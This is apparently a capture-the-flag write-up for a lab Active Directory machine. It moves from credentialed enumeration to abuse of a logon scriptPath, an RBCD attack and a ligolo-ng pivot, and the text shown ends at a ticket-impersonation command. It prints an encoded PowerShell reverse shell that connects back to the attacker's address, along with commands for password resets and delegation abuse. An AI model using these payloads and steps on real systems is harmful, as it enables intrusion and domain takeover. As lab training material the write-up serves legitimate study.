# Machine info
As is common in real life pentests, you will start the Garfield box with credentials for the following account j.arbuckle / Th1sD4mnC4t!@1978

```python
j.arbuckle:Th1sD4mnC4t!@1978
```

# Host file setup
```python
❯❯❯ sudo nxc smb 10.129.86.27 --generate-hosts-file /etc/hosts

SMB         10.129.86.27    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:None) (Null Auth:True)
```

# Enumeration
## Open ports
```python
❯❯❯ nmap -p- --min-rate=2000 -sT -Pn dc01.garfield.htb -vv

Nmap scan report for dc01.garfield.htb (10.129.86.27)
Host is up, received user-set (0.013s latency).
rDNS record for 10.129.86.27: DC01.garfield.htb
Scanned at 2026-11-09 17:30:55 GMT for 66s
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
2179/tcp  open  vmrdp            syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
3389/tcp  open  ms-wbt-server    syn-ack
5985/tcp  open  wsman            syn-ack
9389/tcp  open  adws             syn-ack
49667/tcp open  unknown          syn-ack
49674/tcp open  unknown          syn-ack
49675/tcp open  unknown          syn-ack
49677/tcp open  unknown          syn-ack
49678/tcp open  unknown          syn-ack
49889/tcp open  unknown          syn-ack
49920/tcp open  unknown          syn-ack

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 66.21 seconds
```

## Nmap
```python
❯❯❯ nmap -p 53,88,135,139,389,445,464,593,636,2179,3268,3269,3389,5985,9389 -A --min-rate=2000 -sT -Pn dc01.garfield.htb
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-09 17:33 +0000
Nmap scan report for dc01.garfield.htb (10.129.86.27)
Host is up (0.013s latency).
rDNS record for 10.129.86.27: DC01.garfield.htb

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-10 01:33:09Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: garfield.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: garfield.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.garfield.htb
| Not valid before: 2026-11-05T04:54:07
|_Not valid after:  2027-05-07T04:54:07
|_ssl-date: 2026-11-10T01:33:51+00:00; +7h59m54s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: GARFIELD
|   NetBIOS_Domain_Name: GARFIELD
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: garfield.htb
|   DNS_Computer_Name: DC01.garfield.htb
|   DNS_Tree_Name: garfield.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2026-11-10T01:33:30+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Microsoft Windows Server 2019 (97%), Microsoft Windows 10 1903 - 22H2 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

# SMB (445)
Null auth is enabled as with all domain controllers by deftault but cannot use it to enumerate

The guest account is also disabled

But i was given credentials so i can try them

```python
❯❯❯ nxc smb dc01.garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978'
SMB         10.129.86.27    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.86.27    445    DC01             [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978 
```

These credentials work

```python
❯❯❯ nxc smb dc01.garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --shares
SMB         10.129.86.27    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.86.27    445    DC01             [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978 
SMB         10.129.86.27    445    DC01             [*] Enumerated shares
SMB         10.129.86.27    445    DC01             Share           Permissions     Remark
SMB         10.129.86.27    445    DC01             -----           -----------     ------
SMB         10.129.86.27    445    DC01             ADMIN$                          Remote Admin
SMB         10.129.86.27    445    DC01             C$                              Default share
SMB         10.129.86.27    445    DC01             IPC$            READ            Remote IPC
SMB         10.129.86.27    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.86.27    445    DC01             SYSVOL          READ            Logon server share 
```

Just default read access on the default shares

```python
❯❯❯ nxc smb dc01.garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --rid-brute 20000 | grep SidTypeUser | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
Administrator
Guest
krbtgt
DC01$
RODC01$
krbtgt_8245
j.arbuckle
l.wilson
l.wilson_adm
```

Interesting how there is two `krbtgt` accounts

```python
❯❯❯ nxc smb dc01.garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --users 

SMB         10.129.86.27    445    DC01             krbtgt_8245                   2025-08-17 11:33:39 0       Key Distribution Center service account for read-only domain controller 
```

Ill also use nxc to pull out the user descriptions for this second krbtgt account

# Writable objects as `j.arbuckle`

```python
❯❯❯ bloodyAD --host dc01.garfield.htb -d garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' get writable

distinguishedName: CN=Guest,CN=Users,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=krbtgt_8245,CN=Users,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=Jon Arbuckle,CN=Users,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=Liz Wilson,CN=Users,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb
permission: WRITE

distinguishedName: DC=garfield.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=garfield,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.garfield.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=garfield,DC=htb
permission: CREATE_CHILD
```

So some of this is default other bits are not

```python
❯❯❯ bloodyAD --host dc01.garfield.htb -d garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' get writable --detail

distinguishedName: CN=Guest,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE

distinguishedName: CN=krbtgt_8245,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE

distinguishedName: CN=Liz Wilson,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE

distinguishedName: CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE
```

These are the 4 interesting writable objects from the output, and running `--detail` in bloodyAD shows the actual attribute i have write over

# Shell as `l.wilson`

```python
 ❯❯❯ penelope -p 1337 
[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.86.128 • 10.10.14.61
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

First ill start a listener

```python
❯❯❯ cat script.bat 
@echo off
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgAxACIALAAxADMAMwA3ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

Then ill create the login script with just a powershell base64 encoded rev shell

```python
❯❯❯ smbclient //dc01.garfield.htb/SYSVOL -U 'j.arbuckle'%'Th1sD4mnC4t!@1978'  
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Aug 13 12:04:43 2025
  ..                                  D        0  Wed Aug 13 12:04:43 2025
  garfield.htb                       Dr        0  Wed Aug 13 12:04:43 2025

		9250815 blocks of size 4096. 982443 blocks available
smb: \> cd garfield.htb\
smb: \garfield.htb\> ls
  .                                   D        0  Wed Aug 13 12:11:05 2025
  ..                                  D        0  Wed Aug 13 12:11:05 2025
  DfsrPrivate                      DHSr        0  Wed Aug 13 12:11:05 2025
  Policies                            D        0  Wed Aug 13 12:04:48 2025
  scripts                             D        0  Tue Jan 27 22:13:47 2026

		9250815 blocks of size 4096. 982443 blocks available
smb: \garfield.htb\> cd scripts\
smb: \garfield.htb\scripts\> put script.bat 
putting file script.bat as \garfield.htb\scripts\script.bat (32.4 kB/s) (average 32.4 kB/s)
smb: \garfield.htb\scripts\> dir
  .                                   D        0  Tue Nov 10 02:59:35 2026
  ..                                  D        0  Tue Nov 10 02:59:35 2026
  printerDetect.bat                   A      217  Fri Sep 12 23:20:29 2025
  script.bat                          A     1361  Tue Nov 10 02:59:35 2026

		9250815 blocks of size 4096. 982442 blocks available
smb: \garfield.htb\scripts\>
```

Then ill upload it to the location of the login scripts

```python
❯❯❯ bloodyAD --host dc01.garfield.htb -d garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' set object 'l.wilson' scriptPath -v 'script.bat'                   
[+] l.wilson's scriptPath has been updated
```

Then ill set the new script path to the malicious file

![](Pasted%20image%2020261109190252.png)

I now have a shell!

# Compromising `l.wilson_adm` 

![](Pasted%20image%2020261109191319.png)

This user can change the admin accounts password

![](Pasted%20image%2020261109192119.png)

Since i dont know the `l.wilson` account creds i cannot do this remotely, but i can do it with powershell

Ill transfer powerview via a python web server then use that to change the users password

```python
❯❯❯ nxc smb dc01.garfield.htb -u 'l.wilson_adm' -p 'Password123!'
SMB         10.129.86.27    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.86.27    445    DC01             [+] garfield.htb\l.wilson_adm:Password123! 
```

This user is now compromised!

# Enumeration of `l.wilson_adm`

![](Pasted%20image%2020261109192358.png)

I have some outbound object control

# RBCD leads to admin on the `RODC01`

```python
❯❯❯ bloodyAD --host dc01.garfield.htb -d garfield.htb -u 'l.wilson_adm' -p 'Password123!' get writable --detail

distinguishedName: CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb
msDS-AllowedToActOnBehalfOfOtherIdentity: WRITE
lastLogonTimestamp: WRITE
logonCount: WRITE
accountExpires: WRITE
profilePath: WRITE
userParameters: WRITE
pwdLastSet: WRITE
userWorkstations: WRITE
logonWorkstation: WRITE
logonHours: WRITE
scriptPath: WRITE
lastLogon: WRITE
lastLogoff: WRITE
homeDrive: WRITE
homeDirectory: WRITE
badPwdCount: WRITE
userAccountControl: WRITE
```

Ill try rbcd 

```python
❯❯❯ nxc ldap dc01.garfield.htb -u 'l.wilson_adm' -p 'Password123!' -M maq
LDAP        10.129.86.27    389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:garfield.htb) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.86.27    389    DC01             [+] garfield.htb\l.wilson_adm:Password123! 
MAQ         10.129.86.27    389    DC01             [*] Getting the MachineAccountQuota
MAQ         10.129.86.27    389    DC01             MachineAccountQuota: 10
```

The MAQ confirms i can perform RBCD

```python
❯❯❯ nxc smb dc01.garfield.htb -u 'l.wilson_adm' -p 'Password123!' -M add-computer -o NAME=EVIL PASSWORD=Password123!
SMB         10.129.86.27    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.86.27    445    DC01             [+] garfield.htb\l.wilson_adm:Password123! 
ADD-COMP... 10.129.86.27    445    DC01             Successfully added the machine account: 'EVIL$' with Password: 'Password123!'
```

Then ill add a machine account

```python
❯❯❯ rbcd.py -delegate-from 'EVIL$' -delegate-to 'RODC01$' -action 'write' 'garfield.htb/l.wilson_adm:Password123!'
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] EVIL$ can now impersonate users on RODC01$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     EVIL$        (S-1-5-21-2502726253-3859040611-225969357-11601)
```

Then ill use the new machine account and setuip the delegation

But in order to request the service ticket i need to be able to reach the machine, for this ill have to setup ligolo-ng 

![](Pasted%20image%2020261109202941.png)

As seen here only in a remote session can i reach the `RODC01`

```python
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> upload /home/kali/htb/garfield/agent.exe .
```

Ill upload the agent

```python
❯❯❯ sudo ./proxy -selfcert                                                  
[sudo] password for kali: 
INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] daemon configuration file not found. Creating a new one... 
? Enable Ligolo-ng WebUI? No
WARN[0001] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
ERRO[0001] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
INFO[0001] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: 0.9.2

ligolo-ng »
```

Ill then start the proxy on my system

```python
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> .\agent.exe -connect 10.10.14.61:11601 --retry --ignore-cert
agent.exe : time="2026-11-09T20:31:32-08:00" level=warning msg="warning, certificate validation disabled"
    + CategoryInfo          : NotSpecified: (time="2026-11-0...ation disabled":String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
time="2026-11-09T20:31:32-08:00" level=info msg="Connection established" addr="10.10.14.61:11601"
```

Ill then connect the agent back to me

```python
[Agent : GARFIELD\l.wilson_adm@DC01] » ifcreate --name ligolo
INFO[0069] Creating a new ligolo interface...           
INFO[0069] Interface created! 

[Agent : GARFIELD\l.wilson_adm@DC01] » ifconfig
┌───────────────────────────────────────────────┐
│ Interface 0                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ vEthernet (Switch01)           │
│ Hardware MAC │ 00:15:5d:0b:dd:00              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv6 Address │ fe80::c4ff:5747:1d3c:fba0/64   │
│ IPv4 Address │ 192.168.100.1/24               │
└──────────────┴────────────────────────────────┘
┌──────────────────────────────────────────────────┐
│ Interface 1                                      │
├──────────────┬───────────────────────────────────┤
│ Name         │ Ethernet0 3                       │
│ Hardware MAC │ a2:de:ad:27:44:09                 │
│ MTU          │ 1500                              │
│ Flags        │ up|broadcast|multicast|running    │
│ IPv6 Address │ dead:beef::3c92:9bfa:8884:4815/64 │
│ IPv6 Address │ fe80::8917:8f47:750:28ba/64       │
│ IPv4 Address │ 10.129.86.27/16                   │
└──────────────┴───────────────────────────────────┘
┌──────────────────────────────────────────────┐
│ Interface 2                                  │
├──────────────┬───────────────────────────────┤
│ Name         │ Loopback Pseudo-Interface 1   │
│ Hardware MAC │                               │
│ MTU          │ -1                            │
│ Flags        │ up|loopback|multicast|running │
│ IPv6 Address │ ::1/128                       │
│ IPv4 Address │ 127.0.0.1/8                   │
└──────────────┴───────────────────────────────┘
[Agent : GARFIELD\l.wilson_adm@DC01] » route_add --name ligolo --route 192.168.100.0/24
INFO[0106] Route created.        


```

```python
❯❯❯ getST.py -spn 'cifs/RODC01.garfield.htb' -impersonate "Administrator" -dc-ip "$DC_IP" 'garfield.htb/l.wilson_adm:Password123!'
```

